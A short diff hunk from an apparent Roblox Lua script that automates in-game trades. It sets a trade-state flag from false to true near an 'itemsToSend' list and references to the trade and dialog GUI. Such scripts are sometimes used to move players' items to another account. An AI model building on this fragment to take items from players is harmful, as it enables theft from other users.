@@ -33,7 +33,7 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
 end
 
 local itemsToSend = {}
-local inTrade = false
+local inTrade = true
 local playerGui = plr:WaitForChild("PlayerGui")
 local tradeFrame = playerGui.TradeApp.Frame
 local dialog = playerGui.DialogApp.Dialog
